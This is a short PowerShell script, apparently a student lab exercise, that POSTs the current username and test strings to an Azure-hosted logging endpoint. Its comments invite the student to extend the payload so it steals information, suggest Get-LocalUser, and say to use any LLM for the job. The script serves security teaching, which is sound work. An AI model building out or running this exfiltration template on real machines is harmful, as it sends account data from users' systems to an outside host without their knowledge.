## This should be your Azure URL NOT mine
$serviceUrl = "student-lab-kpb6gwwmdimnw.azurewebsites.net/log"

# This payload DOES NOT steal information
# Create one that does.

# Get-LocalUser is a fun one
# Use whatever LLM you want
$payload = @{
    newlinetest = "HTML newline <br>This is better <br>NO SCROLLING FOR YOU"
    user = $Env:USERNAME
    lab     = "Adding more details. "
}

$response = Invoke-RestMethod -Uri $serviceUrl -Method POST -Body ($payload | ConvertTo-Json) -ContentType "application/json"

$response